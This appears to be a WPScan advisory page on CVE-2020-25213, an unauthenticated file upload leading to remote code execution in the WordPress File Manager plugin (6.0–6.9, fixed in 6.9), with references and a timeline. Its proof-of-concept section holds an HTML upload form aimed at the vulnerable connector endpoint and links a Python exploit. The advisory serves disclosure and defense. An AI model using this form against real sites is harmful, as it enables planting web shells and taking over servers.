Target url https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9:
Skip to content

[](/)

  * [Features](https://a8cteam5105.wordpress.com/features/)
  * [Pricing](https://a8cteam5105.wordpress.com/pricing/)
  * Solutions
    * [Status](https://status.wpscan.com/)
    * [API Details](/api)
    * [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
  * Vulnerabilities
    * [Themes](/themes)
    * [WordPress](/wordpresses)
    * [Plugins](/plugins)
    * [Stats](/statistics)
    * [Submit Vulnerabilities](/submit)
    * [Leaderboard](/leaderboard)
  * Resources
    * [Blog](/blog)
    * [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
    * [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
    * [WPScan Glossary](/wpscan-glossary)
    * [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)



Search

Login[Talk to sales](/contact/enterprise)

##  WordPress Plugin Vulnerabilities

# File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE

### Description

Seravo noticed multiple cases where WordPress sites were breached using 0-day in wp-file-manager (confirmed with v6.8, which was the latest version available in wordpress.org).

File lib/php/connector.minimal.php can be by default opened directly, and this file loads lib/php/elFinderConnector.class.php which reads POST/GET variables, and then allows executing some internal features, like uploading files. PHP is allowed, thus this leads to unauthenticated arbitrary file upload and remote code execution.

It seems that this vulnerability was originally discovered and published publicly on Twitter on August 26th (see references), and was later seen being exploited in the wild by Seravo.

### Proof of Concept

https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py <html> <body> <form method="POST" enctype="multipart/form-data" action="https://example.com/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"> <input type="hidden" name="cmd" value="upload"/> <input type="hidden" name="target" value="l1_Lw"/> <input type="file" name="upload[]"/><br/><br/> <input type="submit" value="Upload"/> </form> </body>

### Affects Plugins

[ ![Plugin icon](https://s0.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg) wp-file-manager ](https://a8cteam5105.wordpress.com/plugin/wp-file-manager/)

![](https://s0.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg) Fixed in 6.9 

### References

CVE 

[CVE-2020-25213](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213)

URL 

<https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/>

URL 

<https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/>

URL 

<https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/>

URL 

<https://blog.sucuri.net/2020/09/critical-vulnerability-file-manager-affecting-700k-wordpress-websites.html>

URL 

<https://twitter.com/w4fz5uck5/status/1298402173554958338>

### Miscellaneous

Original Researcher 

w4fz5uck5 

Submitter 

Ville Korhonen 

Submitter website 

<https://seravo.com>

Submitter twitter 

[Seravo](//twitter.com/Seravo)

Verified 

Yes 

WPVDB ID 

[e528ae38-72f0-49ff-9878-922eff59ace9](https://a8cteam5105.wordpress.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9/)

### Timeline

Publicly Published 

2020-09-01 (about 5 years ago) 

Added 

2020-09-01 (about 5 years ago) 

Last Updated 

2021-07-19 (about 4 years ago) 

### Other

Published 

Title 

Published 

2025-01-03

Title 

[ JobBoard Job listing < 1.2.7 - Unauthenticated Arbitrary File Upload ](https://a8cteam5105.wordpress.com/vulnerability/e35e43fa-91f0-455f-bf61-b9638e930515/)

Published 

2024-10-17

Title 

[ WP Dropbox Dropins <= 1.0 - Unauthenticated Arbitrary File Upload ](https://a8cteam5105.wordpress.com/vulnerability/44d017df-f66a-4ba7-9100-932b0086837a/)

Published 

2024-11-11

Title 

[ Do That Task <= 1.5.5 - Unauthenticated Arbitrary File Upload ](https://a8cteam5105.wordpress.com/vulnerability/f22da1d4-1d81-422f-984a-3c91978cbe74/)

Published 

2019-04-11

Title 

[ Ninja Forms File Uploads Extension <= 3.0.22 - Unauthenticated Arbitrary File Upload ](https://a8cteam5105.wordpress.com/vulnerability/e5898e0e-db43-4641-b2cd-f6a72cdb8993/)

Published 

2025-04-23

Title 

[ PowerPress Podcasting plugin by Blubrry < 11.12.6 - Authenticated (Contributor+) Stored Cross-Site Scripting ](https://a8cteam5105.wordpress.com/vulnerability/a316b4c0-544a-4fbc-9790-76851880bb65/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

  * [WordPress](/wordpresses)
  * [Plugins](/plugins)
  * [Themes](/themes)
  * [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
  * [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)



#### About

  * [How it works](/features)
  * [Pricing](/pricing)
  * [WordPress plugin](https://wordpress.org/plugins/wpscan/)
  * [Blog](/blog)
  * [Contact](/contact)



#### For Developers

  * [Status](https://status.wpscan.com/)
  * [API details](/api)
  * [CLI scanner](/wordpress-cli-scanner)



#### Other

  * [Privacy](https://automattic.com/privacy/)
  * [Terms of service](/terms)
  * [Submission terms](/submission-terms/)
  * [Disclosure policy](/vulnerability-disclosure-policy)
  * [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)



* * *

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

  * [GitHub](https://github.com/wpscanteam/wpscan/)
  * [Twitter](https://twitter.com/_wpscan_)
  * [Facebook](https://www.facebook.com/WPScan)



* * *

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

  * [ Subscribe ]() [ Subscribed ]()

    * [ ![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan ](https://wpscan.com)

Join 30,427 other subscribers

Sign me up 

    * Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)

  *     * [ ![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan ](https://wpscan.com)
    * [ Subscribe ]() [ Subscribed ]()
    * [Sign up](https://wordpress.com/start/)
    * [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
    * [ Report this content ](https://wordpress.com/abuse/?report_url=https://wpscan.com)
    * [ View site in Reader ](https://wordpress.com/reader/feeds/156197069)
    * [Manage subscriptions](https://subscribe.wordpress.com/)
    * [Collapse this bar]()




![](https://pixel.wp.com/g.gif?blog=221720208&v=wpcom&tz=-4&user_id=0&arch_home=1&subd=a8cteam5105&host=wpscan.com&ref=&rand=0.579796508388335)

Notifications